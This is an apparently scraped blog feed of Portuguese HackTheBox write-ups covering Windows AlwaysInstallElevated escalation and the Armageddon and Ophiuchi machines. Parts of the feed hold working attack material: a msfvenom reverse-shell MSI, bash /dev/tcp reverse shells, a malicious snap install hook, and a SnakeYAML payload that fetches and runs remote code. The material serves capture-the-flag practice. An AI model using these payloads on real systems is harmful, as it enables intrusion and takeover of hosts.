<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">exploit/windows/local/always_install_elevated
</code></pre></div><p>Para executar os módulos .msi manualmente no host sem provocar interferências do sistema de proteção do Windows é interessante desabilitar o UAC (User Account Control) como forma de prevenção.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">powershell.exe -nop -exec bypass
</code></pre></div><p>Chamando o powershell para executar comandos mais avançados no sistema.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">powershell
</code></pre></div><p>Ainda no shell do usuário podemos subir ao host o módulo PowerUp.ps1 e logo em seguida fazer a importação do mesmo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Invoke-WebRequest &#39;&lt;ip&gt;:&lt;port&gt;/PowerUp.ps1&#39; -OutFile C:\Users\Phoebe\Downloads\PowerUp.ps1

Import-Module ./PowerUp.ps1
</code></pre></div><p>O PowerUP.ps1 possui o comando abaixo para criar dentro do diretório atual um binário MSI Windows para escalar privilégios. Após gerar o binário basta executá-lo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Write-UserAddMSI
</code></pre></div><p>Comando para verificar se o privilégio está habilitado.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Get-RegistryAlwaysInstallElevated
</code></pre></div><p>Neste outro <a href="https://powersploit.readthedocs.io/en/latest/Privesc/Write-UserAddMSI/">link</a> é mostrado como usar o módulo UserAdd.msi para poder criar um novo usuário com privilégios.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Write-UserAddMSI
</code></pre></div>
    <img src="https://i.imgur.com/JPKUXgo.png"  alt="Usuário rottenadmin criado"  class="center"  style="border-radius: 8px;"  />


<p>Com o msfvenom podemos gerar na máquina local um payload para obter a shell do usuário administrator.</p>

    <img src="https://i.imgur.com/1GMDBlH.png"  alt="Msfvenom reverse.msi"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o reverse.msi
</code></pre></div><p>Efetuando no host o download do reverse.msi.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Invoke-WebRequest &#39;&lt;ip&gt;:&lt;port&gt;/reverse.msi&#39; -OutFile C:\Users\Phoebe\Downloads\reverse.msi
</code></pre></div><p>Executando o reverse.msi no host.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">msiexec /quiet /qn /i reverse.msi
</code></pre></div><p>Recebendo o &lsquo;reverse shell&rsquo; com usuário NT AUTHORITY SYSTEM.</p>

    <img src="https://i.imgur.com/VG9gskz.png"  alt="Administrator Reverse Shell"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo a flag do usuário Administrator.</p>

    <img src="https://i.imgur.com/079TVTW.png"  alt="Administrator Flag"  class="center"  style="border-radius: 8px;"  />


<p>Conforme mostrado neste &lsquo;writeup&rsquo; existem várias maneiras de escalar privilégios no Windows quando o &lsquo;AlwaysInstallElevated&rsquo; está habilitado no sistema.</p>
<p>Até a próxima!</p>
]]></content>
        </item>
        
        <item>
            <title>HackTheBox - Armageddon</title>
            <link>https://brunomcuesta.github.io/posts/2021/08/hackthebox-armageddon/</link>
            <pubDate>Fri, 20 Aug 2021 20:32:28 -0300</pubDate>
            
            <guid>https://brunomcuesta.github.io/posts/2021/08/hackthebox-armageddon/</guid>
            <description>Neste &amp;lsquo;writeup&amp;rsquo; veremos a resolução da máquina &amp;lsquo;Armageddon&amp;rsquo; do HackTheBox.
Informações da Máquina IP: 10.10.10.233
Sistema Operacional: Linux
Nível de dificuldade: Easy
Varredura e Enumeração Port Scan Iniciando um scan completo em todas as portas TCP abertas com nmap:
# Nmap 7.91 scan initiated Sat Jun 26 22:18:58 2021 as: nmap -v -sV -sC -p 22,80 -Pn -oN details.txt 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.37s latency).</description>
            <content type="html"><![CDATA[
    <img src="https://i.imgur.com/e4mrb6U.jpg"  alt="Armageddon Cover"  class="center"  style="border-radius: 8px;"  />


<p>Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Armageddon&rsquo; do <a href="https://www.hackthebox.eu/">HackTheBox</a>.</p>
<h2 id="informações-da-máquina">Informações da Máquina</h2>
<p>IP: 10.10.10.233</p>
<p>Sistema Operacional: Linux</p>
<p>Nível de dificuldade: Easy</p>
<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
<h3 id="port-scan">Port Scan</h3>
<p>Iniciando um scan completo em todas as portas TCP abertas com nmap:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Sat Jun 26 22:18:58 2021 as: nmap -v -sV -sC -p 22,80 -Pn -oN details.txt 10.10.10.233</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.233
Host is up <span style="color:#f92672">(</span>0.37s latency<span style="color:#f92672">)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16<span style="color:#f92672">)</span>
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-generator: Drupal <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>http://drupal.org<span style="color:#f92672">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: <span style="color:#ae81ff">36</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Sat Jun 26 22:19:25 2021 -- 1 IP address (1 host up) scanned in 27.48 seconds</span>
</code></pre></div><h3 id="webserver">Webserver</h3>
<p>O host possui apenas duas portas abertas, a 22 e a 80. Acessando a porta 80 encontramos a seguinte página.</p>

    <img src="https://i.imgur.com/M9Bo9fS.png"  alt="Armageddon - Página Inicial"  class="center"  style="border-radius: 8px;"  />


<p>No robots.txt é possível visualizar diversas URLs liberadas e bloqueadas para indexação.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://10.10.10.233/robots.txt

User-agent: *
Crawl-delay: 10
# CSS, JS, Images
Allow: /misc/*.css$
Allow: /misc/*.css?
Allow: /misc/*.js$
Allow: /misc/*.js?
Allow: /misc/*.gif
Allow: /misc/*.jpg
Allow: /misc/*.jpeg
Allow: /misc/*.png
Allow: /modules/*.css$
Allow: /modules/*.css?
Allow: /modules/*.js$
Allow: /modules/*.js?
Allow: /modules/*.gif
Allow: /modules/*.jpg
Allow: /modules/*.jpeg
Allow: /modules/*.png
Allow: /profiles/*.css$
Allow: /profiles/*.css?
Allow: /profiles/*.js$
Allow: /profiles/*.js?
Allow: /profiles/*.gif
Allow: /profiles/*.jpg
Allow: /profiles/*.jpeg
Allow: /profiles/*.png
Allow: /themes/*.css$
Allow: /themes/*.css?
Allow: /themes/*.js$
Allow: /themes/*.js?
Allow: /themes/*.gif
Allow: /themes/*.jpg
Allow: /themes/*.jpeg
Allow: /themes/*.png
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
</code></pre></div><p>Com o objetivo de obter mais informações da página foi usado o &lsquo;whatweb&rsquo; para visualizar mais detalhes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ whatweb http://10.10.10.233
</code></pre></div><p>A saída do comando revelou que o host está usando um CMS PHP chamado Drupal em sua versão 7.</p>
<pre><code class="language-textplain" data-lang="textplain">http://10.10.10.233 [200 OK] Apache[2.4.6], Content-Language[en],
Country[RESERVED][ZZ], Drupal, 
HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], 
IP[10.10.10.233], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)],
PHP[5.4.16], PasswordField[pass], PoweredBy[Arnageddon],
Script[text/javascript], Title[Welcome to  Armageddon |  Armageddon],
UncommonHeaders[x-content-type-options,x-generator],
X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.4.16]
</code></pre><h2 id="vulnerabilidade">Vulnerabilidade</h2>
<p>Com a versão do CMS foi feita a busca por vulnerabilidades e exploits.</p>

    <img src="https://i.imgur.com/ggD5SPz.png"  alt="Google - Drupal Exploit"  class="center"  style="border-radius: 8px;"  />


<p>O exploit encontrado é referente a <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600">CVE-2018-7600</a> e está disponível no <a href="https://github.com/pimps/CVE-2018-7600">github</a>. O exploit permite a um atacante remoto executar arbitrariamente comandos no host (RCE - Remote Code Execution).</p>

    <img src="https://i.imgur.com/U1zMkBR.png"  alt="Github - Drupal 7 Exploit"  class="center"  style="border-radius: 8px;"  />


<h2 id="exploração">Exploração</h2>
<p>Clonando o projeto para a máquina local.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone https://github.com/pimps/CVE-2018-7600.git
</code></pre></div><p>Executando o script em python para efetuar o RCE (Remote Code Execution).</p>

    <img src="https://i.imgur.com/125h1zN.png"  alt="Execução do exploit"  class="center"  style="border-radius: 8px;"  />


<p>Também existe um exploit no <a href="https://www.exploit-db.com/exploits/44449">exploitdb</a> que permite obter um &lsquo;reverse shell&rsquo; através do metasploit.</p>

    <img src="https://i.imgur.com/jQcUYiI.png"  alt="Metasploit Drupalgeddon2"  class="center"  style="border-radius: 8px;"  />


<p>Com o metasploit foi possível visualizar os arquivos de configuração da aplicação e obter as credenciais do banco Mysql. O caminho para o arquivo de configuração do Drupal pode ser obtido consultando a sua <a href="https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory">doc</a> oficial.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">/var/www/html/sites/default/cat settings.php
</code></pre></div>
    <img src="https://i.imgur.com/t0LN8uD.png"  alt="Drupal Settings"  class="center"  style="border-radius: 8px;"  />


<p>Credenciais do banco Mysql.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">drupaluser:CQHEy@9M*m23gBVj
</code></pre></div><p>Conectando ao banco de dados com as credenciais se obtêm os usuários e senhas cadastrados.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ mysql -u drupaluser -e <span style="color:#e6db74">&#39;use drupal;show tables;select name, pass from users;&#39;</span> -p
</code></pre></div>
    <img src="https://i.imgur.com/hCufwve.png"  alt="Usuários e senhas Mysql"  class="center"  style="border-radius: 8px;"  />


<p>Identificando o tipo de &lsquo;hash&rsquo; usada para cadastrar a senha no banco Mysql com o hashcat.</p>

    <img src="https://i.imgur.com/Cpu6Zzq.png"  alt="Hashcat format"  class="center"  style="border-radius: 8px;"  />


<p>Efetuando a quebra de &lsquo;hash&rsquo; com hashcat.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ hashcat -m <span style="color:#ae81ff">7900</span> hash /usr/share/wordlists/rockyou.txt --force
</code></pre></div><p>A senha encontrada é &ldquo;booboo&rdquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">brucetherealadmin:booboo
</code></pre></div><p>Conectando via SSH com as credenciais válidas e obtendo a flag do user.</p>

    <img src="https://i.imgur.com/Aq0a7W3.png"  alt="User flag"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo a versão do sistema operacional.</p>

    <img src="https://i.imgur.com/6AAfVov.png"  alt="Versão OS"  class="center"  style="border-radius: 8px;"  />


<h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
<p>Um procedimento muito usual para escalar privilégios é verificar as permissões do usuário com o sudo. Ao rodar o &lsquo;sudo -l&rsquo; é confirmado que o usuário possui privilégios de root com o &lsquo;snap&rsquo;. Pacotes snaps não necessitam ser instalados na máquina para serem executados.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/snap install *
</code></pre></div><p>Verificando a versão do snap instalado no sistema.</p>

    <img src="https://i.imgur.com/pBk3Ybl.png"  alt="Versão do Snap"  class="center"  style="border-radius: 8px;"  />


<p>No <a href="https://gtfobins.github.io/gtfobins/snap/#sudo">GTFOBins</a> foi encontrada a forma de abusar do snap com o sudo.</p>

    <img src="https://i.imgur.com/wAsAXaW.png"  alt="GTFOBins snap sudo"  class="center"  style="border-radius: 8px;"  />


<p>Antes de gerar o pacote snap malicioso deve-se instalar o fpm na máquina local seguindo o seu <a href="https://fpm.readthedocs.io/en/latest/installing.html">manual</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo gem install --no-document fpm
$ sudo apt install squashfs-tools
</code></pre></div><p>Criando o script makesnap.sh para gerar o pacote snap. O script possui uma linha de código que é o comando de &lsquo;reverse shell&rsquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">  <span style="color:#75715e">#!/bin/bash</span>
  
  COMMAND<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&#39;&#34;</span>
  cd <span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
  mkdir -p meta/hooks
  printf <span style="color:#e6db74">&#39;#!/bin/bash\n%s;&#39;</span> <span style="color:#e6db74">&#34;</span>$COMMAND<span style="color:#e6db74">&#34;</span> &gt; meta/hooks/install
  chmod +x meta/hooks/install
  fpm -n root -s dir -t snap -a all meta
</code></pre></div><p>Executando o script.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ chmod +x makesnap.sh
$ ./makesnap.sh
</code></pre></div><p>O script vai gerar uma pasta no diretório /tmp. Este diretório deve ser compartilhado para poder subir o arquivo .snap ao host.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 -m http.server &lt;port&gt;
</code></pre></div><p>No host foi usado o wget para fazer a transferência do arquivo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget http://&lt;ip&gt;:&lt;port&gt;/xxxx_1.0_all.snap
</code></pre></div><p>Abrindo a porta local para receber o &lsquo;reverse shell&rsquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rlwrap nc -lvnp &lt;port&gt;
</code></pre></div><p>Após abrir a porta local o passo seguinte é executar o comando de instalação do pacote malicioso com o sudo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo snap install xxxx_1.0_all.snap --dangerous --devmode
</code></pre></div><p>Recebendo o &lsquo;reverse shell&rsquo; com a shell do root.</p>

    <img src="https://i.imgur.com/MYKIwZ2.png"  alt="Root Reverse Shell"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo a &lsquo;flag&rsquo; do usuário root.</p>

    <img src="https://i.imgur.com/Ig3Zjib.png"  alt="Root Flag"  class="center"  style="border-radius: 8px;"  />


<p>Até a próxima!</p>
]]></content>
        </item>
        
        <item>
            <title>HackTheBox - Ophiuchi</title>
            <link>https://brunomcuesta.github.io/posts/2021/07/hackthebox-ophiuchi/</link>
            <pubDate>Sat, 03 Jul 2021 13:04:58 -0300</pubDate>
            
            <guid>https://brunomcuesta.github.io/posts/2021/07/hackthebox-ophiuchi/</guid>
            <description>Nesta máquina veremos uma vulnerabilidade de desserialização Yaml. Esta vulnerabilidade permite ao atacante obter acesso ao host através de um RCE (Remote Command Execution). O &amp;lsquo;privesc&amp;rsquo; é feito com a obtenção de credenciais válidas após enumerar diretórios e arquivos dos programas e serviços executados no servidor e abusando das permissões de usuário para obter acesso ao host como usuário root.
Informações da Máquina IP: 10.10.10.227
Sistema Operacional: Linux
Nível de dificuldade: Medium</description>
            <content type="html"><![CDATA[
    <img src="https://i.imgur.com/BQZxGFi.jpg"  alt="Ophiuchi Cover"  class="center"  style="border-radius: 8px;"  />


<p>Nesta máquina veremos uma vulnerabilidade de desserialização Yaml. Esta vulnerabilidade permite ao atacante obter acesso ao host através de um RCE (Remote Command Execution). O &lsquo;privesc&rsquo; é feito com a obtenção de credenciais válidas após enumerar diretórios e arquivos dos programas e serviços executados no servidor e abusando das permissões de usuário para obter acesso ao host como usuário root.</p>
<h2 id="informações-da-máquina">Informações da Máquina</h2>
<p>IP: 10.10.10.227</p>
<p>Sistema Operacional: Linux</p>
<p>Nível de dificuldade: Medium</p>
<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
<h3 id="port-scan">Port Scan</h3>
<p>Esta é a saída do Nmap após um scan utilizando os scripts para verificação de versão dos serviços disponíveis e possíveis vulnerabilidades.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Tue Jun 29 18:17:23 2021 as: nmap -vvv -sC -sV -p 22,8080 -Pn -oN details.txt 10.10.10.227</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.227
Host is up, received user-set <span style="color:#f92672">(</span>0.24s latency<span style="color:#f92672">)</span>.
Scanned at 2021-06-29 18:17:25 -03 <span style="color:#66d9ef">for</span> 17s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">3072</span> 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpzM/GEYunOwIMB+FyQCnOaYRK1DYv8e0+VI3Zy7LnY157q+3SITcgm98JGS/gXgdHQ4JnkCcXjUb9LaNRxRWO+l43E9v2b2U9roG8QetbBUl5CjJ0KHXeIwNgOcsqfwju8i8GA8sqQCELpJ3zKtKtxeoBo+/o3OnKGzT/Ou8lqPK7ESeh6OWCo15Rx9iOBS40i6zk77QTc4h2jGLOgyTfOuSGTWhUxkhqBLqSaHz80G7HsPSs1BA9zAV8BOx9WmtpMsgDcNG14JAQQd904RCzgw0OaQ0J6szs78Us8Piec0rF/T4b1H3sbUedOdA0QKgGbNojObVrz5VwOw6rqxbs1gZLePXB5ZNjm0cp+Sen8TkRkdUf7Sgw92B//RhSoIakp1u5eOPs/uJ6hyCholUnerl3WK8NPB9f9ICPYq8PbvVMu6zcytV/cCjwxFloWB989iyuqG/lYcdMhGJlAacOFy5TRcTB8c5Qlmtl44J/4dyuCJAhj5SY6TRdcSxhmz0<span style="color:#f92672">=</span>
|   <span style="color:#ae81ff">256</span> 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM79V2Ts2us0NxZA7nnN9jor98XRj0hw7QCb+A9U8aEhoYBcrtUqegExaj/yrxjbZ/l0DWw2EkqH4uly451JuMs<span style="color:#f92672">=</span>
|   <span style="color:#ae81ff">256</span> 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO31s/C33kbuzZl9ohJWVEmLsW9aqObU6ZjlpbOQJt0C
8080/tcp open  http    syn-ack ttl <span style="color:#ae81ff">63</span> Apache Tomcat 9.0.38
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Tue Jun 29 18:17:42 2021 -- 1 IP address (1 host up) scanned in 19.64 seconds</span>
</code></pre></div><p>Observando o resultado confirmamos a existência de duas portas abertas, a 22 (SSH) e a 8080 (Tomcat).</p>
<h3 id="webserver">Webserver</h3>
<p>Acessando a aplicação web na porta 8080 temos a seguinte página.</p>

    <img src="https://i.imgur.com/j3hprxn.png"  alt="Página inicial"  class="center"  style="border-radius: 8px;"  />


<p>A página criada é uma ferramenta de &lsquo;parsing&rsquo;. Ou seja, desserializa o conteúdo enviado em sintaxe Yaml e o converte no &lsquo;backend&rsquo; em Java. Para testar a aplicação foi enviado um conteúdo aleatório na sintaxe Yaml.</p>

    <img src="https://i.imgur.com/tGPlLPn.png"  alt="Teste do parser"  class="center"  style="border-radius: 8px;"  />


<p>O servidor responde com uma mensagem de erro.</p>

    <img src="https://i.imgur.com/9GrrsHO.png"  alt="Mensagem de erro"  class="center"  style="border-radius: 8px;"  />


<p>A mensagem informa que a &ldquo;funcionalidade foi desativada devido a razões de segurança&rdquo;, o que confirma que nesta página está a vulnerabilidade.</p>
<h2 id="vulnerabilidade">Vulnerabilidade</h2>
<p>Pesquisando sobre &ldquo;Yaml exploit&rdquo; foi encontrado um exploit no <a href="https://github.com/artsploit/yaml-payload">github</a> que permite um RCE (Remote Command Execution).</p>
<p>A &ldquo;desserialização SnakeYAML&rdquo; consiste em criar um arquivo .jar para que o servidor o execute.</p>
<h2 id="exploração">Exploração</h2>
<p>O primeiro passo é fazer o clone do projeto na máquina local.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone https://github.com/artsploit/yaml-payload.git
</code></pre></div><p>Alterar o arquivo AwesomeScriptEngineFactory.java, colocando o payload para subir um script em bash.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;wget http://&lt;ip&gt;:&lt;port&gt;/myshell.sh -O /tmp/myshell.sh&#34;</span><span style="color:#f92672">);</span>
Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;bash /tmp/myshell.sh&#34;</span><span style="color:#f92672">);</span>
</code></pre></div><p>Feita a alteração é necessário ter o <a href="https://openjdk.java.net/">OpenJDK</a> instalado para efetuar a compilação do arquivo. No caso de não existir o OpenJDK na máquina do atacante, o seguinte comando faz a instalação.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo apt install openjdk-11-jdk
</code></pre></div><p>Efetuando a compilação do arquivo .java para gerar o .class.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ javac src/artsploit/AwesomeScriptEngineFactory.java
</code></pre></div><p>Gerando o arquivo yaml-payload.jar.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ jar -cvf yaml-payload.jar -C src/ .
</code></pre></div><p>Após a criação do executável .jar é necessário criar o script em bash chamado myshell.sh, que fará o &lsquo;reverse shell&rsquo;. Este é o seu conteúdo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
</span><span style="color:#75715e"></span>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;<span style="color:#ae81ff">1</span>
</code></pre></div><p>Na máquina local, duas portas foram abertas para receber as conexões: uma para disponibilizar o .jar ao servidor e a outra para enviar o myshell.sh. Este é payload enviado no site para iniciar o processo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL [&#34;http://&lt;ip&gt;:8000/&#34;]
  ]]
]
</code></pre></div>
    <img src="https://i.imgur.com/aAgLGVd.png"  alt="Envio da mensagem ao parser"  class="center"  style="border-radius: 8px;"  />


<p>O resultado é uma &lsquo;reverse shell&rsquo; com o usuário tomcat.</p>

    <img src="https://i.imgur.com/VqtMyWy.png"  alt="Reverse shell"  class="center"  style="border-radius: 8px;"  />


